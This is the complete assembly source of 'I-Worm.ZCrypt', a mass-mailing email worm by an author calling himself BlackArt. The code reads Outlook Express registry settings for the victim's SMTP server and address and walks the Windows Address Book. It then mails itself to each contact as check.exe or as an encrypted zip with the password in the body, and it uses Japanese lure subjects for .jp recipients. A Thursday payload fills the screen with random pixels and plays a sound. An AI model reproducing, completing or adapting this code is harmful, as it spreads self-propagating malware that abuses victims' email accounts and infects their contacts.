;;;  I-Worm.ZCrypt
;;;                       by BlackArt
;;;
;;;  Feature:
;;;   - Send exe(myself) or encrypted zip file(myself).
;;;   - Has funny payload. (Thursday)
;;;  
;;;  -----------------------------
;;;   0. check local time for payload
;;;   1. create encrypted zip file
;;;   2. encode encrypted zip file and itself to base64
;;;   3. get M$ address book info and spread
;;;  ------------------------------

;;;  Japanese Description:
;;;   é©ï™é©êgÅAÇ‹ÇΩÇÕà√çÜâªZIPâªÇµÇΩé©ï™é©êgÇM$ÉAÉhÉåÉXí Ç∑Ç◊ÇƒÇ…ëóÇÈÅB
;;;   î≠ïaÇ™äyÇµÇ¢ÅB
;;;   Ç Ç∆ÇÕëOÇÃÉèÅ[ÉÄÇ∆ìØÇ∂ÅiÇ¢Ç≠Ç¬Ç©ÉoÉOèCê≥ÇµÇƒÇ ÇÈÅj

    .586p
    .model flat
    locals
    jumps
    
callW  macro    @@@x
    extrn   @@@x:proc
    call    @@@x
endm

ofs equ offset

dwo equ dword ptr
wo equ word ptr
by equ byte ptr

AF_INET     equ 2
SOCK_STREAM equ 1
FILE_ATTRIBUTE_NORMAL   EQU 00000080h
GENERIC_READ        EQU 80000000h
GENERIC_WRITE       EQU 40000000h
CREATE_ALWAYS       EQU 00000002h
OPEN_EXISTING       EQU 00000003h
PAGE_READWRITE      EQU 00000004h
MEM_RESERVE     EQU 00002000h
MEM_COMMIT      EQU 00001000h
FILE_SHARE_READ     EQU 00000001h
HKEY_CURRENT_USER   EQU 80000001h
FILE_SHARE_READ     EQU 00000001h
FILE_SHARE_WRITE    EQU 00000002h
PAGE_READONLY       EQU 00000002h
FILE_MAP_READ       EQU 00000004h
SM_CXSCREEN                          equ 0
SM_CYSCREEN                          equ 1

rdtsc       EQU <dw 310fh>
CRLF        EQU <13, 10>

    .data
thisfilename    db  260 dup(?)  ;  

hfile       dd  ?       ;  file handle
fsize       dd  ?       ;  file size

b64thisfile dd  ?       ;  ptr to buffer to store b64 encoded file

hvmem       dd  ?
temp    dd  ?           ;  temporary buffer

r_seed  dd  98234399h       ;  random seed

hmfile  dd  ?       ;
hmmap   dd  ?       ;  
hmmapview   dd  ?       ;  

str_SMInternetAccountManager    db  'Software\Microsoft\Internet Account Manager',0
str_SMIAccounts         db  'Software\Microsoft\Internet Account Manager\Accounts\'
AccountIdx          db  9 dup(?);  account index
bufsiz_accountidx       dd  9;  size
    
str_DMA             db  'Default Mail Account',0
str_SMTPNAME            db  'SMTP Server',0
str_SMTPEmailAddr       db  'SMTP Email Address',0
str_SMWab4          db  'Software\Microsoft\WAB\WAB4\Wab File Name',0


SMTP_Server         db  50 dup(?)   ;  default smtp server
bufsiz_SMTPSERVER       dd  50
morons_Mailaddr         db  256 dup(?)  ;  mail address of moron :)
bufsiz_morons_mailaddr      dd  256
wab4_path           db  260 dup(?);  wab file path
bufsiz_wab4_path        dd  260

target_mailaddr db  48h dup(?)



sockaddr_in label byte      ;
    sin_family  dw  ?
    sin_port    dw  ?
    sin_addr    dd  ?
    sin_zero    db  8 dup(?)
len_sockaddr_in =   $ - ofs sockaddr_in

sock    dd  ?           ;  socket descriptor

recv_buffer db  1024    dup(?)  ;  recv buffer

zip_filename    db  '666.zip',0 ;  temporary zip file name
zipfilepath db  260 dup(?)  ;  full path of zip file
b64zippedfile   dd  ?
;;;  zip stuff
local_header    label byte
    dd  04034b50h       ;  sig
    dw  2*10            ;
    dw  1
    dw  0
    dw  8c28h
    dw  28e4h
lh_crc  dd  0
lh_compressed_size  dd  0
lh_uncompressed_size    dd  0
    dw  9           ;  len of file name
    dw  0
    db  'check.exe'
len_local_header    = $ - ofs local_header

central_header  label byte
    dd  02014b50h
    dw  2*10
    dw  2*10
    dw  1
    dw  0
    dw  8c28h
    dw  28e4h
ch_crc  dd  0
ch_compressed_size  dd  0
ch_uncompressed_size    dd  0
    dw  9           ;  len of file name
    dw  0
    dw  0
    dw  0
    dw  0
    dd  0
    dd  0
    db  'check.exe'
len_central_header  =   $ - ofs central_header

end_ch_directory    label byte
    dd  06054b50h
    dw  0
    dw  0
    dw  1
    dw  1
    dd  len_central_header
ecd_central_dir dd  len_local_header
    dw  0
len_ch_directory    =   $ - ofs end_ch_directory

smtp_zip_password   db  'Password: '
cipher_key  db  'xxxxxxxx',0
len_cipher_key = 8

key0    dd  305419896
key1    dd  591751049
key2    dd  878082192

crc_init    dd  0ffffffffh

archive_size    dd  ?
byte_to_crc dd  ?

buffer      db  1000 dup(?)



jflag       dd  0       ;  japanese or not

smtp_HELO   db  'HELO localhost',CRLF
len_smtp_HELO   =   $ - ofs smtp_HELO
smtp_MAIL_FROM  db  'MAIL FROM: '
len_smtp_MAIL_FROM  =   $ - ofs smtp_MAIL_FROM
;crlf
smtp_RCPT_TO    db  'RCPT TO: '
len_smtp_RCPT_TO    =   $ - ofs smtp_RCPT_TO
;crlf
smtp_DATA   db  'DATA',CRLF
len_smtp_DATA   =   $ - ofs smtp_DATA
smtp_BODY_FROM  db  'FROM: '
len_smtp_BODY_FROM  =   $ - ofs smtp_BODY_FROM
smtp_BODY_TO    db  CRLF,'TO: '
len_smtp_BODY_TO    =   $ - ofs smtp_BODY_TO
smtp_BODY_SUBJECT   db  CRLF,'SUBJECT: Important',CRLF
len_smtp_BODY_SUBJECT   =   $ - ofs smtp_BODY_SUBJECT

smtp_DOT_CRLF   db  '.',CRLF
len_smtp_DOT_CRLF   =   $ - ofs smtp_DOT_CRLF
smtp_QUIT   db  'QUIT',CRLF
len_smtp_QUIT   =   $ - ofs smtp_QUIT

smtp_crlf   db  CRLF

smtp_MIME_h db  'MIME-Version: 1.0',CRLF
    db  'Content-Type: multipart/mixed; boundary="Boundary-fuck"',CRLF
    db  CRLF
    db  '--Boundary-fuck',CRLF
    db  'Content-Type: text/plain; charset=iso-2022-jp',CRLF
    db  'Content-Transfer-Encoding: 7bit',CRLF
    db  'Content-Description: Mail message body',CRLF
    db  CRLF
len_smtp_MIME_h =   $ - ofs smtp_MIME_h

smtp_MIME_exe   db  CRLF            ;  text
    db  CRLF
    db  '--Boundary-fuck',CRLF
    db  'Content-Type: application/x-msdownload; name="check.exe"',CRLF
    db  'Content-Disposition: attachment;  filename="check.exe"',CRLF
    db  'Content-Transfer-Encoding: BASE64',CRLF
    db  CRLF
len_smtp_MIME_exe   =   $ - ofs smtp_MIME_exe

smtp_MIME_zip   db  CRLF
    db  CRLF
    db  CRLF
    db  '--Boundary-fuck',CRLF
    db  'Content-Type: application/zip; name="important.zip"',CRLF
    db  'Content-Disposition: attachment;  filename="important.zip"',CRLF
    db  'Content-Transfer-Encoding: BASE64',CRLF
    db  CRLF
len_smtp_MIME_zip   =   $ - ofs smtp_MIME_zip

    ;;  base64 body
smtp_MIME_e db  CRLF,'--Boundary-fuck--',CRLF,CRLF
len_smtp_MIME_e =   $ - ofs smtp_MIME_e



smtp_jsubject_1 db  CRLF,'SUBJECT: =?ISO-2022-JP?B?'
len_smtp_jsubject_1 =   $ - ofs smtp_jsubject_1
smtp_jsubject_2 db  '?=',CRLF
len_smtp_jsubject_2 =   $ - ofs smtp_jsubject_2


;;;  japanese subjects table
japanese_subjects   label   byte
    dd  ofs js_01
    dd  ofs js_02
    dd  ofs js_03
    dd  ofs js_04
    dd  ofs js_05
    dd  ofs js_06
    dd  ofs js_07
    dd  ofs js_08
num_of_jsub =   ($ - ofs japanese_subjects)/4

    ; èdóv
js_01   db  'GyRCPUVNVxsoQg==',0
; Re:èdóv
js_02   db  'UmU6GyRCPUVNVxsoQg==',0
; ÉEÉ\ÉR
js_03   db  'GyRCJSYlPSUzGyhC',0
; Ç§ÇÒÇ±
js_04   db  'GyRCJCYkcyQzGyhC',0
; ëÂéñÇ»Ç®ímÇÁÇπ
js_05   db  'GyRCQmc7diRKJCpDTiRpJDsbKEI=',0
; ã…îÈ
js_06   db  'GyRCNktIaxsoQg==',0
; Re:ã…îÈ
js_07   db  'UmU6GyRCNktIaxsoQg==',0
; Ç®Ç‡ÇµÇÎÇ¢Ç‡ÇÃÇÇ›Ç¬ÇØÇ‹ÇµÇΩ
js_08   db  'GyRCJCokYiQ3JG0kJCRiJE4kciRfJEQkMSReJDckPxsoQg==',0

;;;  payload
dcontext    dd  ?
count       dd  ?
x_system    dd  ?
y_system    dd  ?

include wav.inc

    .code
start:
    push    260
    push    ofs thisfilename
    push    0
    callW   GetModuleFileNameA
    test    eax,eax
    jz  exit1
    jmp setup_seh
    db  'I-Worm.ZCrypt'
setup_seh:
    ;;  setup seh
    pushad
    lea eax,exit
    push    eax
    xor eax,eax
    push    dwo fs:[eax]
    mov fs:[eax],esp

    callW   GetTickCount
    mov dwo [r_seed],eax    ;  initialize random seed


    ;;  payload time?
    push    ofs buffer
    callW   GetLocalTime
    lea esi,buffer
    cmp wo [esi+4],4        ;
    jz  payload
    
go:
    call    enc_zip_start
    
    call    create_base64enc

    push    ofs buffer
    push    0101h
    callW   WSAStartup
    test    eax,eax
    jnz exit

    
ms_stuff:
    push    ofs bufsiz_accountidx
    push    ofs AccountIdx
    push    ofs str_DMA
    push    ofs str_SMInternetAccountManager
    call    read_reg
    test    eax,eax
    jnz release_wsa
    push    ofs bufsiz_SMTPSERVER
    push    ofs SMTP_Server
    push    ofs str_SMTPNAME
    push    ofs str_SMIAccounts
    call    read_reg
    test    eax,eax
    jnz release_wsa
    push    ofs bufsiz_morons_mailaddr
    push    ofs morons_Mailaddr
    push    ofs str_SMTPEmailAddr
    push    ofs str_SMIAccounts
    call    read_reg
    test    eax,eax
    jnz release_wsa
    push    ofs bufsiz_wab4_path
    push    ofs wab4_path
    push    0
    push    ofs str_SMWab4
    call    read_reg
    test    eax,eax
    jnz release_wsa

    call    open_wab
    test    eax,eax
    jnz @@close_wab

    call    ms_spread

    @@close_wab:
    call    close_mapped_file

    jmp release_wsa
    

release_wsa:
    callW   WSACleanup
    jmp exit

;;;  ------------------------------------------------------
ms_spread:
    ;;  lifewire ;)
    mov esi,dwo [hmmapview]
    mov ecx,[esi+64h]       ;  num of addr
    jecxz   @@exit
    add esi,[esi+60h]       ;  ptr to addr

    @@spread_loop:
    push    ecx

    mov eax,esi
    cmp by [esi+1],0
    jne @@nounicode
    push    esi
    lea edi,target_mailaddr
    push    edi

    push    48h
    pop ecx
    @@1:
    lodsw
    stosb
    loop    @@1

    pop eax
    pop esi
    add esi,20h

    @@nounicode:
    call    general_spread

    add esi,24h
    pop ecx
    loop    @@spread_loop
    
    @@exit:
    ret
    
general_spread:
    ;;  in
    ;;   eax = mail addr
    push    esi         ;  esi = index
    mov esi,eax         ;  now esi=email addr
    
    push    0
    push    1
    push    2
    callW   socket
    mov dwo [sock],eax

    mov wo [sin_family],AF_INET
    mov ax,25
    xchg    al,ah
    mov wo [sin_port],ax

    push    ofs SMTP_Server
    callW   gethostbyname
    test    eax,eax
    jz  @@exit

    mov eax,[eax+12]
    mov eax,[eax]
    mov eax,[eax]

    mov dwo [sin_addr],eax
    push    len_sockaddr_in
    lea eax,sockaddr_in
    push    eax
    push    dwo [sock]
    callW   connect
    test    eax,eax
    jnz @@exit

    call    sendmail

    push    dwo [sock]
    callW   closesocket
    @@exit:
    pop esi
    ret

;;;  -------------------------------------------------
sendmail:
    push    esi         ;  mail addr
    mov dwo [jflag],0       ;  flag for ".jp"

    call    g_recv

    ;;  HELO
    lea esi,smtp_HELO
    mov ecx,len_smtp_HELO
    call    g_send

    call    g_recv

    ;;  MAIL FROM
    lea esi,smtp_MAIL_FROM
    mov ecx,len_smtp_MAIL_FROM
    call    g_send

    push    ofs morons_Mailaddr
    callW   lstrlen
    mov ecx,eax
    lea esi,morons_Mailaddr
    call    g_send
    mov ecx,2
    lea esi,smtp_crlf
    call    g_send

    call    g_recv

    ;;  RCPT TO
    mov ecx,len_smtp_RCPT_TO
    lea esi,smtp_RCPT_TO
    call    g_send

    pop esi
    push    esi         ;  mail addr

    push    esi
    callW   lstrlen
    push    eax         ;  save len
    mov ecx,eax
    call    g_send

    mov ecx,2
    lea esi,smtp_crlf
    call    g_send

    call    g_recv

    ;;  ".jp"
    pop eax         ;  len of mail address
    pop esi
    push    esi         ;  mail address
    add esi,eax
    sub esi,3
    cmp dwo [esi],00706a2eh ;  .jp
    jne @@1
    inc dwo [jflag]

    ;;  DATA
    @@1:
    lea esi,smtp_DATA
    mov ecx,len_smtp_DATA
    call    g_send

    call    g_recv

    ;;  BODY FROM
    lea esi,smtp_BODY_FROM
    mov ecx,len_smtp_BODY_FROM
    call    g_send


    push    ofs morons_Mailaddr
    callW   lstrlen
    mov ecx,eax
    lea esi,morons_Mailaddr
    call    g_send

    ;;  BODY TO
    lea esi,smtp_BODY_TO
    mov ecx,len_smtp_BODY_TO
    call    g_send

    pop esi
    push    esi

    push    esi
    callW   lstrlen
    mov ecx,eax
    call    g_send

    ;;  BODY SUBJECT
    cmp dwo [jflag],0
    jnz @@jsubject

    mov ecx,len_smtp_BODY_SUBJECT
    lea esi,smtp_BODY_SUBJECT
    call    g_send
    jmp @@body

    @@jsubject:
    ;;  gen subject
    mov ecx,len_smtp_jsubject_1
    lea esi,smtp_jsubject_1
    call    g_send

    mov esi,(num_of_jsub - 1)
    call    rng
    lea esi,japanese_subjects
    mov esi,dwo [esi+eax*4]
    push    esi
    callW   lstrlen
    mov ecx,eax
    call    g_send

    mov ecx,len_smtp_jsubject_2
    lea esi,smtp_jsubject_2
    call    g_send

    @@body:
    lea esi,smtp_MIME_h
    mov ecx,len_smtp_MIME_h
    call    g_send

    push    2
    pop esi
    call    rng
    test    eax,eax
    jz  @@send_zip

    
    lea esi,smtp_MIME_exe
    mov ecx,len_smtp_MIME_exe
    call    g_send
    
    mov esi,dwo [b64thisfile]
    push    esi
    push    esi
    callW   lstrlen
    pop esi
    mov ecx,eax
    call    g_send
    jmp @@mime_end

    @@send_zip:
    push    ofs smtp_zip_password
    callW   lstrlen
    mov ecx,eax
    lea esi,smtp_zip_password
    call    g_send

    
    mov ecx,len_smtp_MIME_zip
    lea esi,smtp_MIME_zip
    call    g_send
    
    mov esi,dwo [b64zippedfile]
    push    esi
    push    esi
    callW   lstrlen
    pop esi
    mov ecx,eax
    call    g_send

    @@mime_end:
    lea esi,smtp_MIME_e
    mov ecx,len_smtp_MIME_e
    call    g_send

    mov ecx,len_smtp_DOT_CRLF
    lea esi,smtp_DOT_CRLF
    call    g_send

    call    g_recv

    ;; QUIT
    mov ecx,len_smtp_QUIT
    lea esi,smtp_QUIT
    call    g_send

    call    g_recv
    pop esi
    ret
;;;  -------------------------------------------------
close_mapped_file:  
    push    dwo [hmfile]
    push    dwo [hmmap]
    push    dwo [hmmapview]
    callW   CloseHandle
    callW   CloseHandle
    callW   CloseHandle
    ret
;;;  -------------------------------------------------
open_wab:
    xor ebx,ebx
    push    ebx
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    ebx
    push    FILE_SHARE_WRITE
    push    GENERIC_READ
    push    ofs wab4_path
    callW   CreateFileA
    inc eax
    jz  @@error
    dec eax
    mov dwo [hmfile],eax

    push    ebx
    push    ebx
    push    ebx
    push    PAGE_READONLY
    push    ebx
    push    eax
    callW   CreateFileMappingA
    mov dwo [hmmap],eax

    push    ebx
    push    ebx
    push    ebx
    push    FILE_MAP_READ
    push    eax
    callW   MapViewOfFile
    mov dwo [hmmapview],eax
    xor eax,eax
    ret
    @@error:
    xor eax,eax
    dec eax
    ret

;;;  ----------------------------------------------------
g_send:
    ;;  in
    ;;   ecx = size
    ;;   esi = ptr to data
    ;;  out
    ;;   eax = ret value of send()
    push    0
    push    ecx
    push    esi
    push    dwo [sock]
    callW   send
    ret
    
g_recv:
    ;;  out
    ;;   error -> eax=-1  success -> eax = 0
    @@again:
    push    0
    push    1024
    push    ofs recv_buffer
    push    dwo [sock]
    callW   recv
    inc eax
    jz  @@recv_error
    cmp eax,1024
    jz  @@again
    xor eax,eax
    ret
    @@recv_error:
    xor eax,eax
    dec eax
    ret

;;;  ------------------------------------------------------------
read_reg    proc    pascal
    arg @@ptr_subkey
    arg @@ptr_value_name
    arg @@ptr_data_buf
    arg @@ptr_data_buf_size
    
    xor ebx,ebx

    push    ofs temp
    push    1
    push    ebx
    push    dwo [@@ptr_subkey]
    push    HKEY_CURRENT_USER
    callW   RegOpenKeyExA
    test    eax,eax
    jnz @@error

    push    dwo [@@ptr_data_buf_size]
    push    dwo [@@ptr_data_buf]
    push    ebx
    push    ebx
    push    dwo [@@ptr_value_name]
    push    dwo [temp]
    callW   RegQueryValueExA
    test    eax,eax
    jnz @@error

    push    dwo [temp]
    callW   RegCloseKey

    xor eax,eax
    ret

    @@error:
    xor eax,eax
    dec eax
    ret
    endp
    
;;;  -----------------------------------------------------------------------
create_base64enc:
    push    ofs b64thisfile
    push    ofs thisfilename
    call    create_b64main
    push    ofs b64zippedfile
    push    ofs zipfilepath
    call    create_b64main
    xor eax,eax
    ret
    
create_b64main  proc    pascal
    arg @@filename      ;  offset of filename
    arg @@ptr_b64       ;  ptr to ptr to buffer address of base64 encoded
    
    xor ebx,ebx
    push    ebx
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    ebx
    push    FILE_SHARE_READ
    push    GENERIC_READ
    push    dwo [@@filename]
    callW   CreateFileA
    inc eax
    jz  @@error
    dec eax
    mov dwo [hfile],eax

    push    0
    push    dwo [hfile]
    callW   GetFileSize
    mov dwo [fsize],eax
    
    add eax,100h
    
    push    PAGE_READWRITE
    push    MEM_RESERVE OR MEM_COMMIT
    push    eax
    push    0
    callW   VirtualAlloc
    mov dwo [hvmem],eax

    push    0
    push    ofs temp
    push    dwo [fsize]
    push    eax
    push    dwo [hfile]
    callW   ReadFile
    test    eax,eax
    jz  @@error

    mov eax,dwo [fsize]
    shl eax,1

    push    PAGE_READWRITE
    push    MEM_RESERVE OR MEM_COMMIT
    push    eax
    push    0
    callW   VirtualAlloc
    mov ebx,dwo [@@ptr_b64]
    mov dwo [ebx],eax

    push    dwo [fsize]
    push    eax
    push    dwo [hvmem]
    call    base64encode

    push    dwo [hfile]
    callW   CloseHandle

    xor eax,eax
    ret 
    
    @@error:
    xor eax,eax
    dec eax
    ret
    endp
    
base64encode    proc    pascal
    arg @@src
    arg @@dest
    arg @@srclen

    mov esi,dwo [@@src]
    mov edi,dwo [@@dest]

    @@b64loop:
    xor eax,eax
    cmp dwo [@@srclen],1
    jne @@srclen2
    lodsb
    push    2
    pop ecx
    mov edx,03d3dh
    dec dwo [@@srclen]
    jmp @@b64next

    @@srclen2:
    cmp dwo [@@srclen],2
    jne @@srclen3
    lodsw
    push    3
    pop ecx
    push    03dh
    pop edx
    sub dwo [@@srclen],2
    jmp @@b64next
    @@srclen3:
    lodsd
    push    4
    pop ecx
    xor edx,edx
    dec esi
    sub dwo [@@srclen],3

    @@b64next:
    bswap   eax

    @@b64n_loop:
    mov ebx,eax
    and eax,0fc000000h
    rol eax,6
    mov al,[@@b64table + eax]
    stosb
    mov eax,ebx
    shl eax,6
    dec ecx
    jnz @@b64n_loop

    cmp dwo [@@srclen],0
    jnz @@b64loop

    mov eax,edx
    stosd
    ret
    @@b64table  db  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    endp
    
    
;;;  ------------------------------------------------------
;;;   generate encripted zip
;;;  
;;;   the legend t-2000
enc_zip_start:
    xor ebx,ebx
    push    ebx
    push    ebx
    push    OPEN_EXISTING
    push    ebx
    push    FILE_SHARE_READ
    push    GENERIC_READ
    push    ofs thisfilename
    callW   CreateFileA
    mov dwo [hfile],eax

    push    0
    push    dwo [hfile]
    callW   GetFileSize

    mov dwo [lh_uncompressed_size], eax
    mov dwo [ch_uncompressed_size],eax
    add eax,12
    mov dwo [lh_compressed_size],eax
    mov dwo [lh_compressed_size],eax
    add dwo [ecd_central_dir],eax
    mov dwo [archive_size],eax

    push    PAGE_READWRITE
    push    MEM_RESERVE OR MEM_COMMIT
    push    eax
    push    0
    callW   VirtualAlloc
    mov edi,eax

    add eax,12

    push    0
    push    ofs temp
    push    dwo [archive_size]
    push    eax
    push    dwo [hfile]
    callW   ReadFile

    push    dwo [hfile]
    callW   CloseHandle

    push    ofs zipfilepath
    push    260
    callW   GetTempPathA
    test    eax,eax
    jz  @@error_exit

    push    ofs zip_filename
    push    ofs zipfilepath
    callW   lstrcat
    
    xor ebx,ebx
    push    ebx
    push    FILE_ATTRIBUTE_NORMAL
    push    CREATE_ALWAYS
    push    ebx
    push    ebx
    push    GENERIC_WRITE
    push    ofs zipfilepath
    callW   CreateFileA
    mov dwo [hfile],eax

    call    gen_encrypted_zip

    push    len_local_header
    pop ecx
    mov edx,ofs local_header
    call    write_file

    mov ecx,dwo [archive_size]
    mov edx,edi
    call    write_file

    push    len_central_header+len_ch_directory
    pop ecx
    push    ofs central_header
    pop edx
    call    write_file

    push    dwo [hfile]
    callW   CloseHandle

    @@exit:
    xor eax,eax
    ret

    @@error_exit:
    xor eax,eax
    dec eax
    ret
    

write_file:
    push    0
    push    ofs temp
    push    ecx
    push    edx
    push    dwo [hfile]
    callW   WriteFile
    ret

gen_encrypted_zip:
    pushad

    call    @@init_cipher_key
    
    push    len_cipher_key
    pop ecx

    lea esi,cipher_key
    
    @@init_keys:
    lodsb
    call    @@update_keys
    loop    @@init_keys

    push    edi
    callW   GetTickCount

    stosd

    xor eax,0deadbeefh
    stosd

    add eax,-666
    stosd

    mov ecx,dwo [lh_uncompressed_size]
    mov esi,edi
    call    @@crc

    mov dwo [lh_crc],eax
    mov dwo [ch_crc],eax

    dec edi

    rol eax,(1*8)
    stosb

    pop edi

    mov ecx,dwo [lh_compressed_size]

    @@encrypt_stream:
    mov eax,dwo [key2]
    or  al,2

    mov ebx,eax

    xor al,1
    mul bx

    xor ah,[edi]
    xchg    [edi],ah

    mov al,ah
    call    @@update_keys

    inc edi

    loop    @@encrypt_stream
    popad
    ret
    
    
    @@update_keys:
    pushad

    mov edx,dwo [key0]
    call    @@update_crc

    not eax

    mov dwo [key0],eax

    movzx   eax,al

    add eax,dwo [key1]
    mov ecx,134775813
    mul ecx

    inc eax

    mov dwo [key1],eax

    mov edx,dwo [key2]
    shr eax,(3*8)
    call    @@update_crc

    not eax

    mov dwo [key2],eax

    popad
    ret

    @@update_crc:
    push    1
    pop ecx

    mov dwo [crc_init],edx

    lea esi,byte_to_crc
    mov [esi],al

    @@crc:
    push    edx
    push    esi

    push    -1
    pop edx

    xchg    dwo [crc_init],edx
    cld

    @@load_character:
    lodsb

    xor dl,al
    mov al,8

    @@crc_byte:
    shr edx,1
    jnc @@loop_crc_byte

    xor edx,0edb88320h

    @@loop_crc_byte:
    dec al
    jnz @@crc_byte
    loop    @@load_character

    @@exit_calc_crc:
    xchg    edx,eax
    not eax

    pop esi
    pop edx
    ret

    @@init_cipher_key:
    pushad
    push    8
    pop ecx
    lea edi,cipher_key
    @@init_cipher_key_loop:
    mov esi,('z'-'a')
    call    rng
    add eax,'a'
    stosb
    loop    @@init_cipher_key_loop
    popad
    ret
;;;  ---------------------------------------------------------
rng:
    ;;  random number generator in range
    ;;  in
    ;;   esi = range
    ;;  out
    ;;   eax = random number
    push    edx
    rdtsc
    xor eax,edx
    imul    eax,dwo [r_seed]
    dec eax
    mov dwo [r_seed],eax
    xor edx,edx
    div esi
    mov eax,edx
    pop edx
    ret
    
;;;  ---------------------------------------------------------
exit:
    ;;  restore seh
    pop dwo fs:[0]
    add esp,4
    popad
exit1:
    ;;  normal exit
    push    0
    callW   ExitProcess
    
    
;;;  ------------------------------------------------------
payload:
    push    0
    callW   GetDC
    test    eax,eax
    jz  @@exit

    mov dwo [dcontext],eax

    push    SM_CXSCREEN
    callW   GetSystemMetrics
    mov dwo [x_system],eax

    push    eax
    
    push    SM_CYSCREEN
    callW   GetSystemMetrics
    mov dwo [y_system],eax

    pop ebx
    mul ebx
    
    mov dwo [count],0
    @@moremore:
    push    eax         ;  count
    
    push    000000ffh
    mov esi,dwo [y_system]
    call    rng
    push    eax
    mov esi,dwo [x_system]
    call    rng
    push    eax
    push    dwo [dcontext]
    callW   SetPixel

    inc dwo [count]
    pop eax
    cmp dwo [count],eax
    jz  @@exit
    
    @@sleep:
    jmp @@moremore


    @@exit:
    push    4h      ;SND_MEMORY
    push    0
    push    ofs wav
    callW   PlaySound
    
    jmp go          ;  
end start
